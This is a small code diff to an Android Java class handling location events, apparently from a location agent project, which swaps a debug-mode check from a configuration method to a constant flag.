@@ -19,6 +19,7 @@ import android.util.Log;
 import com.android.service.agent.position.GPSLocator;
 import com.android.service.agent.position.GPSLocatorDistance;
 import com.android.service.agent.position.RangeObserver;
+import com.android.service.auto.AutoConfig;
 import com.android.service.conf.Configuration;
 import com.android.service.util.DataBuffer;
 
@@ -46,7 +47,7 @@ public class EventLocation extends EventBase implements RangeObserver {
 			locator.join();
 		} catch (InterruptedException e) {
 			
-			if(Configuration.isDebug()) { e.printStackTrace(); }
+			if(AutoConfig.DEBUG) { e.printStackTrace(); }
 		}
 		locator = null;
 	}
